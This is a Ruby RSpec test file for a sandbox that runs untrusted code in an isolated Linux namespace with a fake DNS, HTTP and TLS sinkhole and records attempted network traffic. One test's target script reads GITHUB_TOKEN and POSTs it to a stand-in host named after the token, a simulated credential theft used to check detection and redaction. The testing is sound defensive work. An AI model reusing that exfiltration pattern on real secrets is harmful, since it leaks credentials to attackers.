# frozen_string_literal: true

require "bonebed/sinkhole"
require "bonebed/sinkhole/protocol"
require "bonebed/sinkhole/server"
require "socket"

RSpec.describe Bonebed::Sinkhole::Protocol do
  def question(name, type)
    [123, 0x100, 1, 0, 0, 0].pack("n6") + name.split(".").map { |part| [part.bytesize].pack("C") + part }.join + "\0" + [type, 1].pack("n2")
  end

  it "answers only bounded ordinary DNS questions with loopback A and AAAA records" do
    response, name = described_class.dns(question("probe.example.invalid", 1))
    expect(name).to eq("probe.example.invalid")
    expect(response.byteslice(-4, 4)).to eq([127, 0, 0, 1].pack("C4"))
    expect(response.unpack("n6")).to eq([123, 0x8180, 1, 1, 0, 0])
    expect(described_class.dns(question("probe.example.invalid", 28)).first.byteslice(-16, 16)).to eq("\0" * 15 + "\1")
    expect(described_class.dns("bad")).to be_nil
    expect(described_class.dns(question("probe", 1).sub("\x05probe", "\xc0\x0c".b))).to be_nil
    expect(described_class.dns("x" * 65_536)).to be_nil
  end

  it "parses complete bounded HTTP headers and preserves host and request target" do
    data = "POST /token?q=canary HTTP/1.1\r\nHost: secret.example.invalid:80\r\nContent-Length: 4\r\n\r\nbody"
    expect(described_class.http(data)).to eq("protocol" => "http", "method" => "POST", "host" => "secret.example.invalid:80", "path" => "/token?q=canary", "sample" => data)
    expect(described_class.http("GET / HTTP/1.1\r\nHost: x")).to be_nil
    expect(described_class.http("GET / HTTP/1.1\r\nHost: x\r\nHost: y\r\n\r\n")).to be_nil
    expect(described_class.http("GET / HTTP/1.1\r\nHost: x\0y\r\n\r\n")).to be_nil
  end

  it "extracts TLS ClientHello SNI without interpreting application bytes" do
    name = "secret.example.invalid"
    server_name = [0, name.bytesize].pack("Cn") + name
    extension = [server_name.bytesize].pack("n") + server_name
    extensions = [0, extension.bytesize].pack("nn") + extension
    hello = [0x303].pack("n") + "x" * 32 + "\0" + [2, 0x1301].pack("nn") + "\1\0" + [extensions.bytesize].pack("n") + extensions
    handshake = "\1" + [hello.bytesize].pack("N").byteslice(1, 3) + hello
    record = [22, 0x303, handshake.bytesize].pack("Cnn") + handshake
    expect(described_class.tls(record)).to eq("protocol" => "tls", "host" => name)
    expect(described_class.tls(record.byteslice(0, record.bytesize - 1))).to be_nil
    expect(described_class.tls(record.sub(name, "x\0" + name.byteslice(2..)))).to be_nil
    expect(described_class.tls("x" * 65_536)).to be_nil
  end
end

RSpec.describe Bonebed::Collector do
  it "detaches transported nested values and validates target status invariants" do
    collector = described_class.new
    collector.record_exec(path: "/bin/true", argv: ["true"])
    exported = collector.export_state
    exported.fetch("executions").first.fetch("event").fetch("argv").first.replace("changed")
    expect(collector.export_state.fetch("executions").first.fetch("event").fetch("argv")).to eq(["true"])
    state = JSON.parse(JSON.generate(collector.export_state))
    imported = described_class.new.import_state!(state)
    state.fetch("executions").first.fetch("event").fetch("argv").first.replace("changed")
    expect(imported.export_state.fetch("executions").first.fetch("event").fetch("argv")).to eq(["true"])
    [{"exit_status" => 256, "signal" => nil}, {"exit_status" => 0, "signal" => 9}, {"exit_status" => nil, "signal" => 0}].each do |invalid|
      state["target"] = invalid.merge("timed_out" => false)
      expect { described_class.new.import_state!(state) }.to raise_error(ArgumentError, /target status/)
    end
  end

  it "round trips explicit JSON transport state and rejects malformed event counts" do
    collector = described_class.new
    collector.record_open(mode: :read, path: "/tmp/fixture")
    collector.record(:changes, operation: :chmod, path: "/tmp/fixture", mode: 0o600)
    collector.record_exec(path: "/bin/true", argv: ["true"])
    collector.record_notification
    collector.cleanup_metadata = {"mode" => "tracked", "completed" => true}
    collector.network_intent = [{"protocol" => "http", "host" => "canary.example.invalid", "path" => "/"}]
    collector.finish(Process.clock_gettime(Process::CLOCK_MONOTONIC), nil)
    exported = JSON.parse(JSON.generate(collector.export_state))
    imported = described_class.new.import_state!(exported)
    normalizer = Bonebed::PathNormalizer.new
    expect(imported.snapshot(normalizer)).to eq(collector.snapshot(normalizer))
    exported.fetch("events").fetch("changes")[0]["count"] = -1
    expect { described_class.new.import_state!(exported) }.to raise_error(ArgumentError)
  end
end

RSpec.describe Bonebed::Sinkhole::Server do
  it "counts repeated HTTP requests without retaining duplicate samples" do
    server = described_class.new(dns_port: 0, http_port: 0, tls_port: 0, ipv6: false).start
    2.times do
      TCPSocket.open("127.0.0.1", server.port(:http)) do |socket|
        socket.write("GET / HTTP/1.1\r\nHost: example.invalid\r\n\r\n")
        expect(socket.read).to include("204")
      end
    end
    server.stop
    expect(server.events).to contain_exactly(include("protocol" => "http", "count" => 2))
    expect(server.errors).to be_empty
  ensure
    server&.stop
  end
end

RSpec.describe Bonebed::Sinkhole do
  it "rejects a tampered or unsigned worker response" do
    encoded = described_class.encode_response({"collector" => {"target" => {"exit_status" => 7}}}, "secret")
    expect(described_class.decode_response(encoded, "secret")).to eq("collector" => {"target" => {"exit_status" => 7}})
    expect { described_class.decode_response(encoded.sub("7", "0"), "secret") }.to raise_error(described_class::Unavailable, /authentication/)
    expect { described_class.decode_response('{"collector":{}}', "secret") }.to raise_error(described_class::Unavailable, /envelope/)
  end

  it "fails closed when namespace startup is unavailable" do
    allow(described_class).to receive(:namespace_prefix).and_raise(Bonebed::Sinkhole::Unavailable, "denied")
    expect { described_class.run(["/bin/true"], env: {}, cwd: Dir.pwd) }.to raise_error(Bonebed::Sinkhole::Unavailable, /denied/)
  end

  it "observes loopback HTTP in a private namespace with no external route" do
    skip "Linux namespaces are required" unless RUBY_PLATFORM.include?("linux")
    code = <<~'RUBY'
      require "socket"
      begin
        TCPSocket.new("198.51.100.1", 80)
        abort "external route exists"
      rescue Errno::ENETUNREACH
      end
      socket = TCPSocket.new("127.0.0.1", 80)
      socket.write("POST /synthetic-token HTTP/1.1\r\nHost: secret.example.invalid\r\nContent-Length: 0\r\n\r\n")
      puts socket.read
      socket.close
    RUBY
    collector = described_class.run([RbConfig.ruby, "-e", code], env: {"PATH" => ENV.fetch("PATH")}, cwd: Dir.pwd, quiet_target: true)
    snapshot = collector.snapshot(Bonebed::PathNormalizer.new)
    expect(snapshot[:errors]).to be_empty
    expect(snapshot[:observer_errors]).to be_empty
    expect(snapshot[:isolation]).to eq("sinkhole_namespace")
    expect(snapshot[:network_intent]).to include(include("protocol" => "http", "host" => "secret.example.invalid", "path" => "/synthetic-token"))
    expect(snapshot[:listen]).to be_empty
    expect(snapshot[:stdout]).to include("204")
  end

  it "resolves fake DNS and captures a split POST body for canary redaction" do
    skip "Linux namespaces are required" unless RUBY_PLATFORM.include?("linux")
    Bonebed::GemEnvironment.open do |environment|
      token = environment.env.fetch("GITHUB_TOKEN")
      code = <<~'RUBY'
        require "socket"
        token = ENV.fetch("GITHUB_TOKEN")
        host = "#{token}.example.invalid"
        socket = TCPSocket.new(host, 80)
        socket.write("POST /upload HTTP/1.1\r\nHost: #{host}\r\nContent-Length: #{token.bytesize}\r\n\r\n")
        sleep 0.05
        socket.write(token)
        puts socket.read
        socket.close
      RUBY
      collector = described_class.run([RbConfig.ruby, "-e", code], env: environment.env, cwd: environment.project, quiet_target: true)
      snapshot = collector.snapshot(environment.normalizer)
      expect(snapshot[:errors]).to be_empty, snapshot[:stderr]
      expect(snapshot[:observer_errors]).to be_empty
      expect(snapshot[:dns].keys).to include(name: "#{token}.example.invalid")
      expect(snapshot[:network_intent]).to include(include("host" => "#{token}.example.invalid", "sample" => end_with(token)))
      redacted = environment.honeypot.redact("network_intent" => snapshot[:network_intent])
      expect(redacted["canary_hits"]).to include("source" => "env:GITHUB_TOKEN", "seen_in" => "network_intent")
      expect(JSON.generate(redacted)).not_to include(token)
    end
  end

  it "captures TLS SNI without decrypting or completing TLS" do
    skip "Linux namespaces are required" unless RUBY_PLATFORM.include?("linux")
    name = "tls.example.invalid"
    names = [0, name.bytesize].pack("Cn") + name
    extension = [names.bytesize].pack("n") + names
    extensions = [0, extension.bytesize].pack("nn") + extension
    hello = [0x303].pack("n") + "x" * 32 + "\0" + [2, 0x1301].pack("nn") + "\1\0" + [extensions.bytesize].pack("n") + extensions
    handshake = "\1" + [hello.bytesize].pack("N").byteslice(1, 3) + hello
    record = [22, 0x303, handshake.bytesize].pack("Cnn") + handshake
    code = 'socket = TCPSocket.new("127.0.0.1", 443); socket.write([ARGV.fetch(0)].pack("H*")); puts socket.read.getbyte(0)'
    collector = described_class.run([RbConfig.ruby, "-rsocket", "-e", code, record.unpack1("H*")], env: {}, cwd: Dir.pwd, quiet_target: true)
    snapshot = collector.snapshot(Bonebed::PathNormalizer.new)
    expect(snapshot[:errors]).to be_empty
    expect(snapshot[:observer_errors]).to be_empty
    expect(snapshot[:network_intent]).to eq([{"protocol" => "tls", "host" => name, "count" => 1}])
    expect(snapshot[:stdout]).to eq("21\n")
  end

  it "preserves target failures and timeouts across JSON transport" do
    skip "Linux namespaces are required" unless RUBY_PLATFORM.include?("linux")
    failure = described_class.run([RbConfig.ruby, "-e", "exit 7"], env: {}, cwd: Dir.pwd, quiet_target: true)
    expect(failure.status.exitstatus).to eq(7)
    expect(failure.errors).to include("target exited with status 7")
    timeout = described_class.run([RbConfig.ruby, "-e", "sleep 30"], env: {}, cwd: Dir.pwd, timeout: 0.1, quiet_target: true)
    expect(timeout.snapshot(Bonebed::PathNormalizer.new)[:target][:timed_out]).to be(true)
  end

  it "refuses to run a target when the helper remains in the original namespace" do
    skip "Linux namespaces are required" unless RUBY_PLATFORM.include?("linux")
    allow(described_class).to receive(:namespace_prefix).and_return([])
    Dir.mktmpdir do |directory|
      marker = File.join(directory, "target-ran")
      expect { described_class.run([RbConfig.ruby, "-e", 'File.write(ARGV.first, "bad")', marker], env: {}, cwd: directory) }
        .to raise_error(Bonebed::Sinkhole::Unavailable, /not isolated/)
      expect(File.exist?(marker)).to be(false)
    end
  end

  it "does not give the target namespace capabilities or access to the worker result pipe" do
    skip "Linux namespaces are required" unless RUBY_PLATFORM.include?("linux")
    code = <<~'RUBY'
      status = File.read("/proc/self/status")
      %w[CapEff CapPrm CapBnd CapAmb].each do |field|
        value = status[/^#{field}:\s+([0-9a-f]+)$/, 1]
        abort "capabilities retained: #{field}" unless value && value.to_i(16).zero?
      end
      begin
        File.open("/proc/#{Process.ppid}/fd/3", "w")
        abort "observer pipe accessible"
      rescue Errno::EACCES, Errno::EPERM
      end
    RUBY
    collector = described_class.run([RbConfig.ruby, "-e", code], env: {}, cwd: Dir.pwd, quiet_target: true)
    snapshot = collector.snapshot(Bonebed::PathNormalizer.new)
    expect(snapshot[:errors]).to be_empty, snapshot[:stderr]
  end
end
